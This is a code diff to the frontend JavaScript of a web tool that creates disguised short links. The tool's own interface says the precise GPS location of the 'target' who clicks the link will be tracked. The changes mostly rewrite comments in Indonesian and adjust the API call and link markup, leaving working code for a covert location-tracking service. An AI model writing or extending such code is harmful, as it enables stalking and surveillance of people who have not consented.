@@ -51,33 +51,35 @@ async function generateMaskedLink() {
   const target = input.value.trim();
   const session = localStorage.getItem('session_token');
 
-  // Validasi
+  // Validasi input kosong
   if (!target) {
     resBox.className = 'result-box error';
     resBox.textContent = '❌ Masukkan URL tujuan terlebih dahulu!';
     return;
   }
 
+  // Validasi sesi login
   if (!session) {
     resBox.className = 'result-box error';
     resBox.textContent = '❌ Silakan login terlebih dahulu!';
     return;
   }
 
-  // Format URL
+  // Format URL target (pastikan ada protokolnya)
   let formattedTarget = target;
   if (!target.startsWith('http://') && !target.startsWith('https://')) {
     formattedTarget = 'https://' + target;
   }
 
-  // Disable button
+  // Ubah status tombol jadi loading
   btn.disabled = true;
   btn.textContent = '⏳ Processing...';
   resBox.className = 'result-box';
   resBox.textContent = '⏳ Membuat link tracking...';
 
   try {
-    const res = await fetch(`/api/r/create?action=create&target=${encodeURIComponent(formattedTarget)}&session=${session}`);
+    // Memanggil endpoint backend api/r/create
+    const res = await fetch(`/api/r/create?target=${encodeURIComponent(formattedTarget)}&session=${session}`);
     const data = await res.json();
 
     if (data.error) {
@@ -86,29 +88,30 @@ async function generateMaskedLink() {
       return;
     }
 
-    // Sukses
+    // Sukses: Tampilkan link di layar
     resBox.className = 'result-box success';
     resBox.innerHTML = `
       ✅ Link berhasil dibuat!<br>
-      🔗 <span class="short-link" onclick="window.open('${data.shortUrl}', '_blank')">${data.shortUrl}</span>
+      🔗 <a href="${data.shortUrl}" target="_blank" class="short-link">${data.shortUrl}</a>
       <br><br>
       <span style="font-size:12px; color:#64748b;">
         📍 GPS presisi &lt; 500m akan dilacak saat target mengklik link
       </span>
     `;
 
-    // Auto copy ke clipboard
+    // Auto copy link ke clipboard
     try {
       await navigator.clipboard.writeText(data.shortUrl);
       resBox.innerHTML += `<br><span style="font-size:12px; color:#22c55e;">📋 Link sudah disalin ke clipboard!</span>`;
     } catch (e) {
-      // Ignore jika clipboard tidak support
+      // Abaikan jika browser memblokir clipboard otomatis
     }
 
   } catch (err) {
     resBox.className = 'result-box error';
     resBox.textContent = '❌ Terjadi kesalahan: ' + err.message;
   } finally {
+    // Kembalikan tombol ke kondisi semula
     btn.disabled = false;
     btn.textContent = 'Bikin Link';
   }
@@ -118,10 +121,10 @@ async function generateMaskedLink() {
 // 3. HANDLE ENTER KEY & INIT
 // ============================================
 document.addEventListener('DOMContentLoaded', function() {
-  // Cek session
+  // Cek session saat halaman pertama kali dimuat
   checkSession();
 
-  // Enter key support
+  // Tombol Enter untuk shortcut bikin link
   const input = document.getElementById('targetUrl');
   if (input) {
     input.addEventListener('keypress', function(e) {
@@ -130,7 +133,7 @@ document.addEventListener('DOMContentLoaded', function() {
       }
     });
 
-    // Auto-focus ke input
+    // Auto-focus ke input URL
     setTimeout(() => input.focus(), 500);
   }
 });
